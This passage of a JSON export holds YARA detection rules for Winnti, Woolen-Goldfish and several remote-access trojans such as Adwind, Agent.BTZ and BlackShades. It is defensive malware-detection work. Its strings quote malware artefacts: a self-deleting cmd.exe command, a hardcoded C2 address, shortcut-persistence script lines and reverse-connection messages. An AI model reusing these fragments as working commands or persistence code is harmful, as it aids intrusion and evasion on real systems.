\"========================================================================================================\" fullword ascii\n        $s3 = \"Content-Disposition: form-data; name=\\\"txt\\\"; filename=\\\"\" fullword ascii\n        $s4 = \"Fail To Enum Service\" fullword ascii\n        $s5 = \"Host Power ON Time\" fullword ascii\n        $s6 = \"%d Hours %2d Minutes %2d Seconds \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 4 of them\n}\n\nrule Winnti_MAL_AirdViper_Sample_Apr18_1\n{\n    meta:\n        description = \"Arid Viper malware sample\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_AirdViper_Sample_Apr18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \\\"%s\\\"\" fullword ascii\n        $x2 = \"daenerys=%s&\" ascii\n        $x3 = \"betriebssystem=%s&anwendung=%s&AV=%s\" ascii\n        $s1 = \"Taskkill /IM  %s /F &  %s\" fullword ascii\n        $s2 = \"/api/primewire/%s/requests/macKenzie/delete\" fullword ascii\n        $s3 = \"\\\\TaskWindows.exe\" ascii\n        $s4 = \"MicrosoftOneDrives.exe\" fullword ascii\n        $s5 = \"\\\\SeanSansom.txt\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 6000KB and (1 of ($x*) or 4 of them)\n}\n\nrule Winnti_MAL_Winnti_Sample_May18_1\n{\n    meta:\n        description = \"Malware sample from Burning Umbrella report - Generic Winnti Rule\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Winnti_Sample_May18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"wireshark\" fullword wide\n        $s2 = \"procexp\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule Winnti_MAL_Visel_Sample_May18_1\n{\n    meta:\n        description = \"Visel malware sample from Burning Umbrella report\"\n        ref = \"https://401trg.pw/burning-umbrella/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MAL_Visel_Sample_May18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"print32.dll\" fullword ascii\n        $s3 = \"c:\\\\a\\\\b.txt\" fullword ascii\n        $s4 = \"\\\\temp\\\\s%d.dat\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.exports(\"szFile\") or 2 of them)\n}\n\nrule Winnti_malware_windows_winnti_loadperf_dll_loader\n{\n    meta:\n        description = \"Winnti APT group; gzwrite64 imported from loadoerf.ini\"\n        ref = \"http://blog.trendmicro.com/trendlabs-security-intelligence/winnti-abuses-github/\"\n        threat_names = \"Winnti Group\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@mimeframe\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"malware_windows_winnti_loadperf_dll_loader\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $s1 = \"loadoerf.ini\" fullword ascii wide\n        $s2 = \"gzwrite64\" fullword ascii wide\n\n    condition:\n        all of ($s*)\n}\n\nrule WoolenGoldfish_Sample_1\n{\n    meta:\n        description = \"Operation Woolen-Goldfish sample\"\n        ref = \"http://goo.gl/NpJpVZ\"\n        threat_names = \"Woolen-Goldfish, Magic Hound\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WoolenGoldfish_Sample_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Cannot execute (%d)\" fullword ascii\n        $s16 = \"SvcName\" fullword ascii\n\n    condition:\n        all of them\n}\n\nrule WoolenGoldfish_Generic_1\n{\n    meta:\n        description = \"Operation Woolen-Goldfish sample\"\n        ref = \"http://goo.gl/NpJpVZ\"\n        threat_names = \"Woolen-Goldfish, Magic Hound\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WoolenGoldfish_Generic_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x0 = \"Users\\\\Wool3n.H4t\\\\\"\n        $x1 = \"C-CPP\\\\CWoolger\"\n        $x2 = \"NTSuser.exe\" fullword wide\n        $s1 = \"107.6.181.116\" fullword wide\n        $s2 = \"oShellLink.Hotkey = \\\"CTRL+SHIFT+F\\\"\" fullword\n        $s3 = \"set WshShell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword\n        $s4 = \"oShellLink.IconLocation = \\\"notepad.exe, 0\\\"\" fullword\n        $s5 = \"set oShellLink = WshShell.CreateShortcut(strSTUP & \\\"\\\\WinDefender.lnk\\\")\" fullword\n        $s6 = \"wlg.dat\" fullword\n        $s7 = \"woolger\" fullword wide\n        $s8 = \"[Enter]\" fullword\n        $s9 = \"[Control]\" fullword\n\n    condition:\n        (1 of ($x*) and 2 of ($s*)) or (6 of ($s*))\n}\n\nrule WoolenGoldfish_Generic_2\n{\n    meta:\n        description = \"Operation Woolen-Goldfish sample\"\n        ref = \"http://goo.gl/NpJpVZ\"\n        threat_names = \"Woolen-Goldfish, Magic Hound\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WoolenGoldfish_Generic_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"modules\\\\exploits\\\\littletools\\\\agent_wrapper\\\\release\" ascii\n\n    condition:\n        all of them\n}\n\nrule WoolenGoldfish_Generic_3\n{\n    meta:\n        description = \"Operation Woolen-Goldfish sample\"\n        ref = \"http://goo.gl/NpJpVZ\"\n        threat_names = \"Woolen-Goldfish, Magic Hound\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WoolenGoldfish_Generic_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"... get header FATAL ERROR !!!  %d bytes read > header_size\" fullword ascii\n        $x2 = \"index.php?c=%S&r=%x&u=1&t=%S\" fullword wide\n        $x3 = \"connect_back_tcp_channel#do_connect:: Error resolving connect back hostname\" fullword ascii\n        $s0 = \"kernel32.dll GetProcAddressLoadLibraryAws2_32.dll\" fullword ascii\n        $s1 = \"Content-Type: multipart/form-data; boundary=%S\" fullword wide\n        $s2 = \"Attempting to unlock uninitialized lock!\" fullword ascii\n        $s4 = \"unable to load kernel32.dll\" fullword ascii\n        $s5 = \"index.php?c=%S&r=%x\" fullword wide\n        $s6 = \"%s len:%d \" fullword ascii\n        $s7 = \"Encountered error sending syscall response to client\" fullword ascii\n        $s9 = \"/info.dat\" fullword ascii\n        $s10 = \"Error entering thread lock\" fullword ascii\n        $s11 = \"Error exiting thread lock\" fullword ascii\n        $s12 = \"connect_back_tcp_channel_init:: socket() failed\" fullword ascii\n\n    condition:\n        (1 of ($x*)) or (8 of ($s*))\n}",
      "send_mail": false,
      "shareable": true
    },
    "10": {
      "builtin": true,
      "builtin_name": "RATs",
      "created": "2020-05-10 14:25:02.654965",
      "id": 10,
      "modified": "2020-08-27 12:53:30.397524",
      "name": "RATs",
      "owner_user_id": null,
      "rules": "import \"pe\"\n\nrule RAT_adWind\n{\n    meta:\n        description = \"Adwind / jRAT\"\n        ref = \"http://malwareconfig.com/stats/adWind\"\n        classifications = \"Backdoor\"\n        threat_names = \"Adwind\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_adWind\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $meta = \"META-INF\"\n        $conf = \"config.xml\"\n        $a = \"Adwind.class\"\n        $b = \"Principal.adwind\"\n\n    condition:\n        all of them\n}\n\nrule Adwind\n{\n    meta:\n        description = \"Adwind / jRAT\"\n        ref = \"https://minerva-labs.com/post/adwind-and-other-evasive-java-rats\"\n        classifications = \"Backdoor\"\n        threat_names = \"Adwind\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Asaf Aprozper, asafa AT minerva-labs.com\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Adwind\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a0 = \"META-INF/MANIFEST.MF\"\n        $a1 = /Main(\\$)Q[0-9][0-9][0-9][0-9]/\n        $PK = \"PK\"\n\n    condition:\n        $PK at 0 and $a0 and $a1\n}\n\nrule jRAT_conf : RAT\n{\n    meta:\n        description = \"Adwind / jRAT configuration\"\n        ref = \"https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py, http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Adwind\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"jRAT_conf\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = /port=[0-9]{1,5}SPLIT/\n\n    condition:\n        $a\n}\n\nrule RAT_Adzok\n{\n    meta:\n        description = \"Adzok RAT\"\n        ref = \"http://malwareconfig.com/stats/Adzok\"\n        classifications = \"Backdoor\"\n        threat_names = \"Adzok\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Adzok\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"config.xmlPK\"\n        $a2 = \"key.classPK\"\n        $a3 = \"svd$1.classPK\"\n        $a4 = \"svd$2.classPK\"\n        $a5 = \"Mensaje.classPK\"\n        $a6 = \"inic$ShutdownHook.class\"\n        $a7 = \"Uninstall.jarPK\"\n        $a8 = \"resources/icono.pngPK\"\n\n    condition:\n        7 of ($a*)\n}\n\nrule Agent_BTZ_Proxy_DLL_1\n{\n    meta:\n        description = \"Agent.BTZ RAT proxy DLL (activeds.dll)\"\n        ref = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Agent.BTZ\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Agent_BTZ_Proxy_DLL_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Modules\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them and pe.exports(\"Entry\"))\n}\n\nrule Agent_BTZ_Proxy_DLL_2\n{\n    meta:\n        description = \"Agent.BTZ RAT proxy DLL (activeds.dll)\"\n        ref = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Agent.BTZ\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Agent_BTZ_Proxy_DLL_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = { 38 21 38 2C 38 37 38 42 38 4D 38 58 38 63 38 6E\n               38 79 38 84 38 8F 38 9A 38 A5 38 B0 38 BB 38 C6\n               38 D1 38 DC 38 E7 38 F2 38 FD 38 08 39 13 39 1E\n               39 29 39 34 39 3F 39 4A 39 55 39 60 39 6B 39 76\n               39 81 39 8C 39 97 39 A2 39 AD 39 B8 39 C3 39 CE\n               39 D9 39 E4 39 EF 39 FA 39 05 3A 10 3A 1B 3A 26\n               3A 31 3A 3C 3A 47 3A 52 3A 5D 3A 68 3A 73 3A 7E\n               3A 89 3A 94 3A 9F 3A AA 3A B5 3A C0 3A CB 3A D6\n               3A E1 3A EC 3A F7 3A }\n        $s2 = \"activeds.dll\" ascii fullword\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them and pe.imphash() == \"09b7c73fbe5529e6de7137e3e8268b7b\"\n}\n\nrule Agent_BTZ_Aug17\n{\n    meta:\n        description = \"Agent.BTZ RAT\"\n        ref = \"http://www.intezer.com/new-variants-of-agent-btz-comrat-found/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Agent.BTZ\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Agent_BTZ_Aug17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"stdole2.tlb\" fullword ascii\n        $s2 = \"UnInstallW\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and all of them and pe.exports(\"Entry\") and pe.exports(\"InstallW\") and pe.exports(\"UnInstallW\"))\n}\n\nrule AlienSpy\n{\n    meta:\n        description = \"AlienSpy RAT\"\n        ref = \"www.fidelissecurity.com/sites/default/files/FTA_1015_Alienspy_FINAL.pdf, www.fidelissecurity.com/sites/default/files/AlienSpy-Configs2_1_2.csv\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"AlienSpy RAT\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"General Dynamics Fidelis Cybersecurity Solutions - Threat Research Team\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"crime_win_rat_AlienSpy\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $sa_1 = \"META-INF/MANIFEST.MF\"\n        $sa_2 = \"Main.classPK\"\n        $sa_3 = \"plugins/Server.classPK\"\n        $sa_4 = \"IDPK\"\n        $sb_1 = \"config.iniPK\"\n        $sb_2 = \"password.iniPK\"\n        $sb_3 = \"plugins/Server.classPK\"\n        $sb_4 = \"LoadStub.classPK\"\n        $sb_5 = \"LoadStubDecrypted.classPK\"\n        $sb_7 = \"LoadPassword.classPK\"\n        $sb_8 = \"DecryptStub.classPK\"\n        $sb_9 = \"ClassLoaders.classPK\"\n        $sc_1 = \"config.xml\"\n        $sc_2 = \"options\"\n        $sc_3 = \"plugins\"\n        $sc_4 = \"util\"\n        $sc_5 = \"util/OSHelper\"\n        $sc_6 = \"Start.class\"\n        $sc_7 = \"AlienSpy\"\n        $sc_8 = \"PK\"\n\n    condition:\n        uint16(0) == 0x4B50 and filesize < 800KB and ((all of ($sa_*)) or (all of ($sb_*)) or (all of ($sc_*)))\n}\n\nrule AmmyyAdmin_Based\n{\n    meta:\n        description = \"Ammyy Admin-based RAT\"\n        classifications = \"RAT\"\n        threat_names = \"Ammyy\"\n        ref = \"http://goo.gl/gkAg2E\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ammyy_Admin_AA_v3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrService.cpp\" fullword ascii\n        $x2 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrDesktopCopyRect.cpp\" fullword ascii\n        $x3 = \"Global\\\\Ammyy.Target.IncomePort\" fullword ascii\n        $x4 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrFmFileSys.cpp\" fullword ascii\n        $x5 = \"Please enter password for accessing remote computer\" fullword ascii\n        $s1 = \"CreateProcess1()#3 %d error=%d\" fullword ascii\n        $s2 = \"CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name.\" fullword ascii\n        $s3 = \"ERROR: CreateProcessAsUser() error=%d, session=%d\" fullword ascii\n        $s4 = \"ERROR: FindProcessByName('explorer.exe')\" fullword ascii\n\n    condition:\n        2 of ($x*) or all of ($s*)\n}\n\nrule RAT_Ap0calypse\n{\n    meta:\n        description = \"Ap0calypse RAT\"\n        ref = \"http://malwareconfig.com/stats/Ap0calypse\"\n        classifications = \"Backdoor\"\n        threat_names = \"Ap0calypse\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Ap0calypse\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"Ap0calypse\"\n        $b = \"Sifre\"\n        $c = \"MsgGoster\"\n        $d = \"Baslik\"\n        $e = \"Dosyalars\"\n        $f = \"Injecsiyon\"\n\n    condition:\n        all of them\n}\n\nrule RAT_Arcom\n{\n    meta:\n        description = \"Arcom RAT\"\n        ref = \"http://malwareconfig.com/stats/Arcom\"\n        classifications = \"Backdoor\"\n        threat_names = \"Arcom\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Arcom\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"CVu3388fnek3W(3ij3fkp0930di\"\n        $a2 = \"ZINGAWI2\"\n        $a3 = \"clWebLightGoldenrodYellow\"\n        $a4 = \"Ancestor for '%s' not found\" wide\n        $a5 = \"Control-C hit\" wide\n        $a6 = {A3 24 25 21}\n\n    condition:\n        all of them\n}\n\nrule RAT_Bandook\n{\n    meta:\n        description = \"Bandook RAT\"\n        ref = \"http://malwareconfig.com/stats/bandook\"\n        classifications = \"Backdoor\"\n        threat_names = \"Bandook\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Bandook\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"aaaaaa1|\"\n        $b = \"aaaaaa2|\"\n        $c = \"aaaaaa3|\"\n        $d = \"aaaaaa4|\"\n        $e = \"aaaaaa5|\"\n        $f = \"%s%d.exe\"\n        $g = \"astalavista\"\n        $h = \"givemecache\"\n        $i = \"%s\\\\system32\\\\drivers\\\\blogs\\\\*\"\n        $j = \"bndk13me\"\n\n    condition:\n        all of them\n}\n\nrule RAT_BlackNix\n{\n    meta:\n        description = \"BlackNix RAT\"\n        ref = \"http://malwareconfig.com/stats/BlackNix\"\n        classifications = \"Backdoor\"\n        threat_names = \"BlackNix\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_BlackNix\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"SETTINGS\" wide\n        $a2 = \"Mark Adler\"\n        $a3 = \"Random-Number-Here\"\n        $a4 = \"RemoteShell\"\n        $a5 = \"SystemInfo\"\n\n    condition:\n        all of them\n}\n\nrule BlackShadesServer\n{\n    meta:\n        description = \"BlackShades RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"BlackShades\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"BlackShadesServer\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $str1 = \"bss_server\"\n        $str2 = \"txtChat\"\n        $str3 = \"UDPFlood\"\n\n    condition:\n        all of them\n}\n\nrule BlackShades_3 : Trojan RAT\n{\n    meta:\n        description = \"BlackShades RAT\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"BlackShades\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackShades_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mod1 = /(m)odAPI/\n        $mod2 = /(m)odAudio/\n        $mod3 = /(m)odBtKiller/\n        $mod4 = /(m)odCrypt/\n        $mod5 = /(m)odFuctions/\n        $mod6 = /(m)odHijack/\n        $mod7 = /(m)odICallBack/\n        $mod8 = /(m)odIInet/\n        $mod9 = /(m)odInfect/\n        $mod10 = /(m)odInjPE/\n        $mod11 = /(m)odLaunchWeb/\n        $mod12 = /(m)odOS/\n        $mod13 = /(m)odPWs/\n        $mod14 = /(m)odRegistry/\n        $mod15 = /(m)odScreencap/\n        $mod16 = /(m)odSniff/\n        $mod17 = /(m)odSocketMaster/\n        $mod18 = /(m)odSpread/\n        $mod19 = /(m)odSqueezer/\n        $mod20 = /(m)odSS/\n        $mod21 = /(m)odTorrentSeed/\n        $tmr1 = /(t)mrAlarms/\n        $tmr2 = /(t)mrAlive/\n        $tmr3 = /(t)mrAnslut/\n        $tmr4 = /(t)mrAudio/\n        $tmr5 = /(t)mrBlink/\n        $tmr6 = /(t)mrCheck/\n        $tmr7 = /(t)mrCountdown/\n        $tmr8 = /(t)mrCrazy/\n        $tmr9 = /(t)mrDOS/\n        $tmr10 = /(t)mrDoWork/\n        $tmr11 = /(t)mrFocus/\n        $tmr12 = /(t)mrGrabber/\n        $tmr13 = /(t)mrInaktivitet/\n        $tmr14 = /(t)mrInfoTO/\n        $tmr15 = /(t)mrIntervalUpdate/\n        $tmr16 = /(t)mrLiveLogger/\n        $tmr17 = /(t)mrPersistant/\n        $tmr18 = /(t)mrScreenshot/\n        $tmr19 = /(t)mrSpara/\n        $tmr20 = /(t)mrSprid/\n        $tmr21 = /(t)mrTCP/\n        $tmr22 = /(t)mrUDP/\n        $tmr23 = /(t)mrWebHide/\n\n    condition:\n        10 of ($mod*) or 10 of ($tmr*)\n}\n\nrule BlackShades2 : Trojan RAT\n{\n    meta:\n        description = \"BlackShades RAT\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackShades2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {62 73 73 5F 73 65 72 76 65 72}\n        $signature2 = {43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}\n        $signature3 = {6D 6F 64 49 6E 6A 50 45}\n\n    condition:\n        $signature1 and $signature2 and $signature3\n}\n\nrule BlackShades_4 : rat\n{\n    meta:\n        description = \"BlackShades RAT\"\n        classifications = \"Backdoor\"\n        threat_names = \"BlackShades\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackShades_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { 42 00 6C 00 61 00 63 00 6B 00 73 00 68 00 61 00 64 00 65 00 73 }\n        $b = { 36 00 3C 00 32 00 20 00 32 00 32 00 26 00 31 00 39 00 3E 00 1D 00 17 00 17 00 1C 00 07 00 1B 00 03 00 07 00 28 00 23 00 0C 00 1D 00 10 00 1B 00 12 00 00 00 28 00 37 00 10 00 01 00 06 00 11 00 0B 00 07 00 22 00 11 00 17 00 00 00 1D 00 1B 00 0B 00 2F 00 26 00 01 00 0B }\n        $c = { 62 73 73 5F 73 65 72 76 65 72 }\n        $d = { 43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44 }\n        $e = { 6D 6F 64 49 6E 6A 50 45 }\n        $apikey = \"f45e373429c0def355ed9feff30eff9ca21eec0fafa1e960bea6068f34209439\"\n\n    condition:\n        any of ($a , $b , $c , $d , $e) or $apikey\n}\n\nrule BlackShades : Trojan\n{\n    meta:\n        description = \"BlackShades RAT\"\n        classifications = \"Trojan, Backdoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Falcoz\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"BlackShades\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $signature1 = {62 73 73 5F 73 65 72 76 65 72}\n        $signature2 = {43 4C 49 43 4B 5F 44 45 4C 41 59 00 53 43 4B 5F 49 44}\n        $signature3 = {6D 6F 64 49 6E 6A 50 45}\n\n    condition:\n        $signature1 and $signature2 and $signature3\n}\n\nrule RAT_BlueBanana\n{\n    meta:\n        description = \"BlueBanana RAT\"\n        ref = \"http://malwareconfig.com/stats/BlueBanana\"\n        classifications = \"Backdoor\"\n        threat_names = \"BlueBanana\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_BlueBanana\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $meta = \"META-INF\"\n        $conf = \"config.txt\"\n        $a = \"a/a/a/a/f.class\"\n        $b = \"a/a/a/a/l.class\"\n        $c = \"a/a/a/b/q.class\"\n        $d = \"a/a/a/b/v.class\"\n\n    condition:\n        all of them\n}\n\nrule RAT_Bozok\n{\n    meta:\n        description = \"Bozok RAT\"\n        ref = \"http://malwareconfig.com/stats/Bozok\"\n        classifications = \"Backdoor\"\n        threat_names = \"Bozok\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kevin Breen <kevin@techanarchy.net>\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"RAT_Bozok\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a = \"getVer\" nocase\n        $b = \"StartVNC\" nocase\n        $c = \"SendCamList\" 